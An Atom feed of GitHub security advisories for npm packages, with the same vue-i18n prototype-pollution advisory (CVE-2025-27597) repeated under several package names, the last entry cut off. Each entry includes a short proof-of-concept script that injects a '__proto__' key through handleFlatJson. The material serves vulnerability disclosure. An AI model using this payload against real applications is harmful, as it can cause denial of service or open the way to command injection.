<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2025-03-07T23:01:26.528Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[vue-i18n] Vue I18n Allows Prototype Pollution in `handleFlatJson`]]></title>
        <id>https://github.com/advisories/GHSA-p2ph-7g93-hw3m</id>
        <link href="https://github.com/advisories/GHSA-p2ph-7g93-hw3m"/>
        <updated>2025-03-07T19:16:46.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Vulnerability type:</strong>
Prototype Pollution</p>
<p><strong>Vulnerability Location(s):</strong></p>
<pre><code class="language-js"># v9.1
node_modules/@intlify/message-resolver/index.js

# v9.2 or later
node_modules/@intlify/vue-i18n-core/index.js
</code></pre>
<p><strong>Description:</strong></p>
<p>The latest version of <code>@intlify/message-resolver (9.1)</code> and <code>@intlify/vue-i18n-core (9.2 or later)</code>, (previous versions might also affected), is vulnerable to Prototype Pollution through the entry function(s) <code>handleFlatJson</code>. An attacker can supply a payload with Object.prototype setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) a the minimum consequence.</p>
<p>Moreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.</p>
<p><strong>PoC:</strong></p>
<pre><code class="language-bash">// install the package with the latest version
~$ npm install @intlify/message-resolver@9.1.10
// run the script mentioned below 
~$ node poc.js
//The expected output (if the code still vulnerable) is below. 
// Note that the output may slightly differs from function to another.
Before Attack:  {}
After Attack:  {"pollutedKey":123}
</code></pre>
<pre><code class="language-js">// poc.js
(async () =&gt; {
    const lib = await import('@intlify/message-resolver');
    var someObj = {}
    console.log("Before Attack: ", JSON.stringify({}.__proto__));
    try {
        // for multiple functions, uncomment only one for each execution.
        lib.handleFlatJson ({ "__proto__.pollutedKey": "pollutedValue" })
    } catch (e) { }
    console.log("After Attack: ", JSON.stringify({}.__proto__));
    delete Object.prototype.pollutedKey;
})();
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m">https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53">https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a">https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e">https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e</a></li>
<li><a href="https://github.com/intlify/vue-i18n/releases/tag/v10.0.6">https://github.com/intlify/vue-i18n/releases/tag/v10.0.6</a></li>
<li><a href="https://github.com/intlify/vue-i18n/releases/tag/v11.1.2">https://github.com/intlify/vue-i18n/releases/tag/v11.1.2</a></li>
<li><a href="https://github.com/intlify/vue-i18n/releases/tag/v9.14.3">https://github.com/intlify/vue-i18n/releases/tag/v9.14.3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27597">https://nvd.nist.gov/vuln/detail/CVE-2025-27597</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a">https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a</a></li>
<li><a href="https://github.com/advisories/GHSA-p2ph-7g93-hw3m">https://github.com/advisories/GHSA-p2ph-7g93-hw3m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p2ph-7g93-hw3m</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-07T15:58:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vue-i18n] Vue I18n Allows Prototype Pollution in `handleFlatJson`]]></title>
        <id>https://github.com/advisories/GHSA-p2ph-7g93-hw3m</id>
        <link href="https://github.com/advisories/GHSA-p2ph-7g93-hw3m"/>
        <updated>2025-03-07T19:16:46.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Vulnerability type:</strong>
Prototype Pollution</p>
<p><strong>Vulnerability Location(s):</strong></p>
<pre><code class="language-js"># v9.1
node_modules/@intlify/message-resolver/index.js

# v9.2 or later
node_modules/@intlify/vue-i18n-core/index.js
</code></pre>
<p><strong>Description:</strong></p>
<p>The latest version of <code>@intlify/message-resolver (9.1)</code> and <code>@intlify/vue-i18n-core (9.2 or later)</code>, (previous versions might also affected), is vulnerable to Prototype Pollution through the entry function(s) <code>handleFlatJson</code>. An attacker can supply a payload with Object.prototype setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) a the minimum consequence.</p>
<p>Moreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.</p>
<p><strong>PoC:</strong></p>
<pre><code class="language-bash">// install the package with the latest version
~$ npm install @intlify/message-resolver@9.1.10
// run the script mentioned below 
~$ node poc.js
//The expected output (if the code still vulnerable) is below. 
// Note that the output may slightly differs from function to another.
Before Attack:  {}
After Attack:  {"pollutedKey":123}
</code></pre>
<pre><code class="language-js">// poc.js
(async () =&gt; {
    const lib = await import('@intlify/message-resolver');
    var someObj = {}
    console.log("Before Attack: ", JSON.stringify({}.__proto__));
    try {
        // for multiple functions, uncomment only one for each execution.
        lib.handleFlatJson ({ "__proto__.pollutedKey": "pollutedValue" })
    } catch (e) { }
    console.log("After Attack: ", JSON.stringify({}.__proto__));
    delete Object.prototype.pollutedKey;
})();
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m">https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53">https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a">https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e">https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e</a></li>
<li><a href="https://github.com/intlify/vue-i18n/releases/tag/v10.0.6">https://github.com/intlify/vue-i18n/releases/tag/v10.0.6</a></li>
<li><a href="https://github.com/intlify/vue-i18n/releases/tag/v11.1.2">https://github.com/intlify/vue-i18n/releases/tag/v11.1.2</a></li>
<li><a href="https://github.com/intlify/vue-i18n/releases/tag/v9.14.3">https://github.com/intlify/vue-i18n/releases/tag/v9.14.3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27597">https://nvd.nist.gov/vuln/detail/CVE-2025-27597</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a">https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a</a></li>
<li><a href="https://github.com/advisories/GHSA-p2ph-7g93-hw3m">https://github.com/advisories/GHSA-p2ph-7g93-hw3m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p2ph-7g93-hw3m</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-07T15:58:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[petite-vue-i18n] Vue I18n Allows Prototype Pollution in `handleFlatJson`]]></title>
        <id>https://github.com/advisories/GHSA-p2ph-7g93-hw3m</id>
        <link href="https://github.com/advisories/GHSA-p2ph-7g93-hw3m"/>
        <updated>2025-03-07T19:16:46.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Vulnerability type:</strong>
Prototype Pollution</p>
<p><strong>Vulnerability Location(s):</strong></p>
<pre><code class="language-js"># v9.1
node_modules/@intlify/message-resolver/index.js

# v9.2 or later
node_modules/@intlify/vue-i18n-core/index.js
</code></pre>
<p><strong>Description:</strong></p>
<p>The latest version of <code>@intlify/message-resolver (9.1)</code> and <code>@intlify/vue-i18n-core (9.2 or later)</code>, (previous versions might also affected), is vulnerable to Prototype Pollution through the entry function(s) <code>handleFlatJson</code>. An attacker can supply a payload with Object.prototype setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) a the minimum consequence.</p>
<p>Moreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.</p>
<p><strong>PoC:</strong></p>
<pre><code class="language-bash">// install the package with the latest version
~$ npm install @intlify/message-resolver@9.1.10
// run the script mentioned below 
~$ node poc.js
//The expected output (if the code still vulnerable) is below. 
// Note that the output may slightly differs from function to another.
Before Attack:  {}
After Attack:  {"pollutedKey":123}
</code></pre>
<pre><code class="language-js">// poc.js
(async () =&gt; {
    const lib = await import('@intlify/message-resolver');
    var someObj = {}
    console.log("Before Attack: ", JSON.stringify({}.__proto__));
    try {
        // for multiple functions, uncomment only one for each execution.
        lib.handleFlatJson ({ "__proto__.pollutedKey": "pollutedValue" })
    } catch (e) { }
    console.log("After Attack: ", JSON.stringify({}.__proto__));
    delete Object.prototype.pollutedKey;
})();
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m">https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53">https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a">https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e">https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e</a></li>
<li><a href="https://github.com/intlify/vue-i18n/releases/tag/v10.0.6">https://github.com/intlify/vue-i18n/releases/tag/v10.0.6</a></li>
<li><a href="https://github.com/intlify/vue-i18n/releases/tag/v11.1.2">https://github.com/intlify/vue-i18n/releases/tag/v11.1.2</a></li>
<li><a href="https://github.com/intlify/vue-i18n/releases/tag/v9.14.3">https://github.com/intlify/vue-i18n/releases/tag/v9.14.3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27597">https://nvd.nist.gov/vuln/detail/CVE-2025-27597</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a">https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a</a></li>
<li><a href="https://github.com/advisories/GHSA-p2ph-7g93-hw3m">https://github.com/advisories/GHSA-p2ph-7g93-hw3m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p2ph-7g93-hw3m</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-07T15:58:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@intlify/vue-i18n-core] Vue I18n Allows Prototype Pollution in `handleFlatJson`]]></title>
        <id>https://github.com/advisories/GHSA-p2ph-7g93-hw3m</id>
        <link href="https://github.com/advisories/GHSA-p2ph-7g93-hw3m"/>
        <updated>2025-03-07T19:16:46.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Vulnerability type:</strong>
Prototype Pollution</p>
<p><strong>Vulnerability Location(s):</strong></p>
<pre><code class="language-js"># v9.1
node_modules/@intlify/message-resolver/index.js

# v9.2 or later
node_modules/@intlify/vue-i18n-core/index.js
</code></pre>
<p><strong>Description:</strong></p>
<p>The latest version of <code>@intlify/message-resolver (9.1)</code> and <code>@intlify/vue-i18n-core (9.2 or later)</code>, (previous versions might also affected), is vulnerable to Prototype Pollution through the entry function(s) <code>handleFlatJson</code>. An attacker can supply a payload with Object.prototype setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) a the minimum consequence.</p>
<p>Moreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.</p>
<p><strong>PoC:</strong></p>
<pre><code class="language-bash">// install the package with the latest version
~$ npm install @intlify/message-resolver@9.1.10
// run the script mentioned below 
~$ node poc.js
//The expected output (if the code still vulnerable) is below. 
// Note that the output may slightly differs from function to another.
Before Attack:  {}
After Attack:  {"pollutedKey":123}
</code></pre>
<pre><code class="language-js">// poc.js
(async () =&gt; {
    const lib = await import('@intlify/message-resolver');
    var someObj = {}
    console.log("Before Attack: ", JSON.stringify({}.__proto__));
    try {
        // for multiple functions, uncomment only one for each execution.
        lib.handleFlatJson ({ "__proto__.pollutedKey": "pollutedValue" })
    } catch (e) { }
    console.log("After Attack: ", JSON.stringify({}.__proto__));
    delete Object.prototype.pollutedKey;
})();
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m">https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53">https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a">https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e">https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e</a></li>
<li><a href="https://github.com/intlify/vue-i18n/releases/tag/v10.0.6">https://github.com/intlify/vue-i18n/releases/tag/v10.0.6</a></li>
<li><a href="https://github.com/intlify/vue-i18n/releases/tag/v11.1.2">https://github.com/intlify/vue-i18n/releases/tag/v11.1.2</a></li>
<li><a href="https://github.com/intlify/vue-i18n/releases/tag/v9.14.3">https://github.com/intlify/vue-i18n/releases/tag/v9.14.3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27597">https://nvd.nist.gov/vuln/detail/CVE-2025-27597</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a">https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a</a></li>
<li><a href="https://github.com/advisories/GHSA-p2ph-7g93-hw3m">https://github.com/advisories/GHSA-p2ph-7g93-hw3m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p2ph-7g93-hw3m</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-07T15:58:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@intlify/vue-i18n-core] Vue I18n Allows Prototype Pollution in `handleFlatJson`]]></title>
        <id>https://github.com/advisories/GHSA-p2ph-7g93-hw3m</id>
        <link href="https://github.com/advisories/GHSA-p2ph-7g93-hw3m"/>
        <updated>2025-03-07T19:16:46.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Vulnerability type:</strong>
Prototype Pollution</p>
<p><strong>Vulnerability Location(s):</strong></p>
<pre><code class="language-js"># v9.1
node_modules/@intlify/message-resolver/index.js

# v9.2 or later
node_modules/@intlify/vue-i18n-core/index.js
</code></pre>
<p><strong>Description:</strong></p>
<p>The latest version of <code>@intlify/message-resolver (9.1)</code> and <code>@intlify/vue-i18n-core (9.2 or later)</code>, (previous versions might also affected), is vulnerable to Prototype Pollution through the entry function(s) <code>handleFlatJson</code>. An attacker can supply a payload with Object.prototype setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) a the minimum consequence.</p>
<p>Moreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.</p>
<p><strong>PoC:</strong></p>
<pre><code class="language-bash">// install the package with the latest version
~$ npm install @intlify/message-resolver@9.1.10
// run the script mentioned below 
~$ node poc.js
//The expected output (if the code still vulnerable) is below. 
// Note that the output may slightly differs from function to another.
Before Attack:  {}
After Attack:  {"pollutedKey":123}
</code></pre>
<pre><code class="language-js">// poc.js
(async () =&gt; {
    const lib = await import('@intlify/message-resolver');
    var someObj = {}
    console.log("Before Attack: ", JSON.stringify({}.__proto__));
    try {
        // for multiple functions, uncomment only one for each execution.
        lib.handleFlatJson ({ "__proto__.pollutedKey": "pollutedValue" })
    } catch (e) { }
    console.log("After Attack: ", JSON.stringify({}.__proto__));
    delete Object.prototype.pollutedKey;
})();
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m">https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53">https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a">https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e">https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e</a></li>
<li><a href="https://github.com/intlify/vue-i18n/releases/tag/v10.0.6">https://github.com/intlify/vue-i18n/releases/tag/v10.0.6</a></li>
<li><a href="https://github.com/intlify/vue-i18n/releases/tag/v11.1.2">https://github.com/intlify/vue-i18n/releases/tag/v11.1.2</a></li>
<li><a href="https://github.com/intlify/vue-i18n/releases/tag/v9.14.3">https://github.com/intlify/vue-i18n/releases/tag/v9.14.3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27597">https://nvd.nist.gov/vuln/detail/CVE-2025-27597</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a">https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a</a></li>
<li><a href="https://github.com/advisories/GHSA-p2ph-7g93-hw3m">https://github.com/advisories/GHSA-p2ph-7g93-hw3m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p2ph-7g93-hw3m</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-07T15:58:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@intlify/core] Vue I18n Allows Prototype Pollution in `handleFlatJson`]]></title>
        <id>https://github.com/advisories/GHSA-p2ph-7g93-hw3m</id>
        <link href="https://github.com/advisories/GHSA-p2ph-7g93-hw3m"/>
        <updated>2025-03-07T19:16:46.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Vulnerability type:</strong>
Prototype Pollution</p>
<p><strong>Vulnerability Location(s):</strong></p>
<pre><code class="language-js"># v9.1
node_modules/@intlify/message-resolver/index.js

# v9.2 or later
node_modules/@intlify/vue-i18n-core/index.js
</code></pre>
<p><strong>Description:</strong></p>
<p>The latest version of <code>@intlify/message-resolver (9.1)</code> and <code>@intlify/vue-i18n-core (9.2 or later)</code>, (previous versions might also affected), is vulnerable to Prototype Pollution through the entry function(s) <code>handleFlatJson</code>. An attacker can supply a payload with Object.prototype setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) a the minimum consequence.</p>
<p>Moreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.</p>
<p><strong>PoC:</strong></p>
<pre><code class="language-bash">// install the package with the latest version
~$ npm install @intlify/message-resolver@9.1.10
// run the script mentioned below 
~$ node poc.js
//The expected output (if the code still vulnerable) is below. 
// Note that the output may slightly differs from function to another.
Before Attack:  {}
After Attack:  {"pollutedKey":123}
</code></pre>
<pre><code class="language-js">// poc.js
(async () =&gt; {
    const lib = await import('@intlify/message-resolver');
    var someObj = {}
    console.log("Before Attack: ", JSON.stringify({}.__proto__));
    try {
        // for multiple functions, uncomment only one for each execution.
        lib.handleFlatJson ({ "__proto__.pollutedKey": "pollutedValue" })
    } catch (e) { }
    console.log("After Attack: ", JSON.stringify({}.__proto__));
    delete Object.prototype.pollutedKey;
})();
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m">https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53">https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a">https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e">https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e</a></li>
<li><a href="https://github.com/intlify/vue-i18n/releases/tag/v10.0.6">https://github.com/intlify/vue-i18n/releases/tag/v10.0.6</a></li>
<li><a href="https://github.com/intlify/vue-i18n/releases/tag/v11.1.2">https://github.com/intlify/vue-i18n/releases/tag/v11.1.2</a></li>
<li><a href="https://github.com/intlify/vue-i18n/releases/tag/v9.14.3">https://github.com/intlify/vue-i18n/releases/tag/v9.14.3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27597">https://nvd.nist.gov/vuln/detail/CVE-2025-27597</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a">https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a</a></li>
<li><a href="https://github.com/advisories/GHSA-p2ph-7g93-hw3m">https://github.com/advisories/GHSA-p2ph-7g93-hw3m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p2ph-7g93-hw3m</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-07T15:58:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@intlify/core-base] Vue I18n Allows Prototype Pollution in `handleFlatJson`]]></title>
        <id>https://github.com/advisories/GHSA-p2ph-7g93-hw3m</id>
        <link href="https://github.com/advisories/GHSA-p2ph-7g93-hw3m"/>
        <updated>2025-03-07T19:16:46.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Vulnerability type:</strong>
Prototype Pollution</p>
<p><strong>Vulnerability Location(s):</strong></p>
<pre><code class="language-js"># v9.1
node_modules/@intlify/message-resolver/index.js

# v9.2 or later
node_modules/@intlify/vue-i18n-core/index.js
</code></pre>
<p><strong>Description:</strong></p>
<p>The latest version of <code>@intlify/message-resolver (9.1)</code> and <code>@intlify/vue-i18n-core (9.2 or later)</code>, (previous versions might also affected), is vulnerable to Prototype Pollution through the entry function(s) <code>handleFlatJson</code>. An attacker can supply a payload with Object.prototype setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) a the minimum consequence.</p>
<p>Moreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.</p>
<p><strong>PoC:</strong></p>
<pre><code class="language-bash">// install the package with the latest version
~$ npm install @intlify/message-resolver@9.1.10
// run the script mentioned below 
~$ node poc.js
//The expected output (if the code still vulnerable) is below. 
// Note that the output may slightly differs from function to another.
Before Attack:  {}
After Attack:  {"pollutedKey":123}
</code></pre>
<pre><code class="language-js">// poc.js
(async () =&gt; {
    const lib = await import('@intlify/message-resolver');
    var someObj = {}
    console.log("Before Attack: ", JSON.stringify({}.__proto__));
    try {
        // for multiple functions, uncomment only one for each execution.
        lib.handleFlatJson ({ "__proto__.pollutedKey": "pollutedValue" })
    } catch (e) { }
    console.log("After Attack: ", JSON.stringify({}.__proto__));
    delete Object.prototype.pollutedKey;
})();
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m">https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53">https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a">https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e">https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e</a></li>
<li><a href="https://github.com/intlify/vue-i18n/releases/tag/v10.0.6">https://github.com/intlify/vue-i18n/releases/tag/v10.0.6</a></li>
<li><a href="https://github.com/intlify/vue-i18n/releases/tag/v11.1.2">https://github.com/intlify/vue-i18n/releases/tag/v11.1.2</a></li>
<li><a href="https://github.com/intlify/vue-i18n/releases/tag/v9.14.3">https://github.com/intlify/vue-i18n/releases/tag/v9.14.3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27597">https://nvd.nist.gov/vuln/detail/CVE-2025-27597</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a">https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a</a></li>
<li><a href="https://github.com/advisories/GHSA-p2ph-7g93-hw3m">https://github.com/advisories/GHSA-p2ph-7g93-hw3m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p2ph-7g93-hw3m</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-07T15:58:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vue-i18n] Vue I18n Allows Prototype Pollution in `handleFlatJson`]]></title>
        <id>https://github.com/advisories/GHSA-p2ph-7g93-hw3m</id>
        <link href="https://github.com/advisories/GHSA-p2ph-7g93-hw3m"/>
        <updated>2025-03-07T19:16:46.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Vulnerability type:</strong>
Prototype Pollution</p>
<p><strong>Vulnerability Location(s):</strong></p>
<pre><code class="language-js"># v9.1
node_modules/@intlify/message-resolver/index.js

# v9.2 or later
node_modules/@intlify/vue-i18n-core/index.js
</code></pre>
<p><strong>Description:</strong></p>
<p>The latest version of <code>@intlify/message-resolver (9.1)</code> and <code>@intlify/vue-i18n-core (9.2 or later)</code>, (previous versions might also affected), is vulnerable to Prototype Pollution through the entry function(s) <code>handleFlatJson</code>. An attacker can supply a payload with Object.prototype setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) a the minimum consequence.</p>
<p>Moreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.</p>
<p><strong>PoC:</strong></p>
